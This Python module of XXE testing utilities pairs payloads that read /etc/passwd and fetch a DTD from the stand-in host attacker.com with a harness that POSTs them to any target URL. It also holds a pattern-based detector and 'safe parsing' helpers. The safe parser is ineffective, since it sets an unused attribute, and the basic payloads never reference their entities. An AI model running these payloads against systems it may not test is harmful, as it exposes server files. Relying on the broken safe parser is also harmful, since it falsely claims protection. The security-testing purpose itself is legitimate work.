"""
XXE (XML External Entity) utility functions.
For educational and security testing purposes only.
Use responsibly and only on systems you own or have permission to test.
"""
import requests
import logging
import datetime
import json
import warnings
import os.path
from typing import Dict, List, Union
from xml.etree.ElementTree import (
    Element, 
    ElementTree, 
    tostring,
    parse, 
    ParseError
)
from urllib.parse import urlparse
import argparse

class XXEPayloads:
    """Class for generating XXE payloads"""
    
    @staticmethod
    def get_basic_payloads() -> List[str]:
        """Return a list of basic XXE payloads"""
        return [
            """<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>""",
            """<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd"> ]>""",
            """<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe; ]>"""
        ]

    @staticmethod
    def generate_custom_payload(file_path: str = None, url: str = None) -> str:
        """Generate a custom XXE payload"""
        if file_path:
            return f"""<!DOCTYPE root [<!ENTITY xxe SYSTEM "file://{file_path}"> ]>"""
        elif url:
            return f"""<!DOCTYPE root [<!ENTITY xxe SYSTEM "{url}"> ]>"""
        return None

class XXETestHarness:
    """Class for testing XXE vulnerabilities in endpoints"""

    def __init__(self, target_url: str):
        self.target_url = target_url
        self.logger = logging.getLogger(__name__)

    def test_endpoint(self, payload: str) -> Dict:
        """Test a single payload against the endpoint"""
        try:
            start_time = datetime.datetime.now()
            response = requests.post(
                self.target_url, 
                data=payload,
                headers={'Content-Type': 'application/xml'}
            )
            end_time = datetime.datetime.now()
            
            return {
                'status_code': response.status_code,
                'response_time': (end_time - start_time).total_seconds(),
                'response_text': response.text,
                'success': response.status_code == 200
            }
        except Exception as e:
            self.logger.error(f"Error testing endpoint: {str(e)}")
            return {'error': str(e)}

    def run_test_suite(self) -> List[Dict]:
        """Run all basic payloads against the endpoint"""
        results = []
        for payload in XXEPayloads.get_basic_payloads():
            result = self.test_endpoint(payload)
            results.append(result)
        return results

def create_secure_xml(content: str) -> str:
    """Create secure XML content"""
    root = Element('root')
    root.text = content
    tree = ElementTree(root)
    return tostring(root, encoding='unicode', xml_declaration=True)

def validate_xml_security(xml_path: str) -> tuple:
    """Validate XML file security"""
    analyzer = XXEAnalyzer()
    vulnerabilities = analyzer.analyze_file(xml_path)
    
    is_safe = len(vulnerabilities) == 0
    validation_report = {
        'timestamp': datetime.datetime.now().isoformat(),
        'file_path': xml_path,
        'is_safe': is_safe,
        'vulnerabilities': vulnerabilities
    }
    
    return is_safe, json.dumps(validation_report, indent=2)

# Update XXEAnalyzer class with additional reporting
def add_to_XXEAnalyzer():
    """Additional methods for XXEAnalyzer class"""
    def get_report(self):
        """Generate a comprehensive security report"""
        severity_counts = {
            'HIGH': 0,
            'MEDIUM': 0,
            'LOW': 0,
            'ERROR': 0
        }
        
        for vuln in self.vulnerabilities:
            severity_counts[vuln['severity']] += 1
            
        return {
            'scan_time': datetime.datetime.now().isoformat(),
            'summary': {
                'total_vulnerabilities': len(self.vulnerabilities),
                'severity_counts': severity_counts
            },
            'vulnerabilities': self.vulnerabilities
        }
    
    # Add method to XXEAnalyzer class
    XXEAnalyzer.get_report = get_report

class XXEAnalyzer:
        """Class for analyzing XML files for XXE vulnerabilities."""
        
        def __init__(self, verbose=False):
            self.vulnerabilities = []
            self.verbose = verbose
            
        def is_safe_entity(self, entity_value):
            """
            Check if an entity declaration appears safe.
            
            Args:
                entity_value (str): The entity value to check
                
            Returns:
                bool: True if entity appears safe, False if potentially dangerous
            """
            dangerous_patterns = [
                "file:",
                "http:",
                "https:",
                "ftp:",
                "/etc/",
                "php:",
                "jar:",
                "netdoc:"
            ]
            
            return not any(pattern in entity_value.lower() for pattern in dangerous_patterns)

        def analyze_file(self, xml_path):
            """
            Analyze an XML file for potential XXE vulnerabilities.
            
            Args:
                xml_path (str): Path to XML file to analyze
                
            Returns:
                list: List of potential vulnerabilities found
            """
            if not os.path.exists(xml_path):
                raise FileNotFoundError(f"XML file not found: {xml_path}")
                
            self.vulnerabilities = []
            
            try:
                if self.verbose:
                    print(f"Analyzing file: {xml_path}")
                    
                with open(xml_path, 'r') as f:
                    content = f.read()
                    
                # Check for DOCTYPE declaration
                if "<!DOCTYPE" in content:
                    vuln = {
                        "type": "DOCTYPE_FOUND",
                        "description": "DOCTYPE declaration found - potential for XXE",
                        "severity": "MEDIUM"
                    }
                    self.vulnerabilities.append(vuln)
                    if self.verbose:
                        print(f"Found vulnerability: {vuln}")
                    
                # Check for ENTITY declarations
                if "<!ENTITY" in content:
                    vuln = {
                        "type": "ENTITY_FOUND",
                        "description": "ENTITY declaration found - potential for XXE",
                        "severity": "HIGH"
                    }
                    self.vulnerabilities.append(vuln)
                    if self.verbose:
                        print(f"Found vulnerability: {vuln}")
                    
                # Check for external references
                if "SYSTEM" in content or "PUBLIC" in content:
                    vuln = {
                        "type": "EXTERNAL_REFERENCE",
                        "description": "External entity reference found",
                        "severity": "HIGH"
                    }
                    self.vulnerabilities.append(vuln)
                    if self.verbose:
                        print(f"Found vulnerability: {vuln}")
                    
            except Exception as e:
                vuln = {
                    "type": "ERROR",
                    "description": f"Error analyzing file: {str(e)}",
                    "severity": "ERROR"
                }
                self.vulnerabilities.append(vuln)
                if self.verbose:
                    print(f"Error: {vuln}")
                
            if self.verbose:
                print(f"Analysis complete. Found {len(self.vulnerabilities)} vulnerabilities.")
                
            return self.vulnerabilities

def create_safe_parser():
    """
    Create a safe XML parser with external entity resolution disabled.
    
    Returns:
        xml.etree.ElementTree.XMLParser: A secured XML parser
    """
    from xml.etree.ElementTree import XMLParser
    parser = XMLParser()
    parser.entity_declaration = lambda *args, **kwargs: None
    return parser

def validate_xml(xml_path):
    """
    Validate XML file for safe parsing.
    
    Args:
        xml_path (str): Path to XML file
        
    Returns:
        tuple: (is_safe: bool, message: str)
    """
    try:
        parser = create_safe_parser()
        tree = parse(xml_path, parser=parser)
        return True, "XML file parsed safely"
    except ParseError as e:
        return False, f"XML parsing error: {str(e)}"
    except Exception as e:
        return False, f"Validation error: {str(e)}"

def generate_safe_template():
    """
    Generate a template for safe XML processing.
    
    Returns:
        str: Safe XML template
    """
    return """<?xml version="1.0" encoding="UTF-8"?>
<!-- Disable DOCTYPE declarations -->
<root>
    <!-- Add your XML content here -->
</root>"""

def extract_urls_from_xml(xml_path):
    """
    Extract URLs from an XML file.
    
    Args:
        xml_path (str): Path to XML file
        
    Returns:
        list: List of URLs found in the XML file
    """
    urls = []
    try:
        tree = parse(xml_path)
        for elem in tree.iter():
            if elem.text:
                for url in elem.text.split():
                    parsed_url = urlparse(url)
                    if parsed_url.scheme:
                        urls.append(url)
    except Exception as e:
        warnings.warn(f"Error extracting URLs: {str(e)}")
        
    return urls



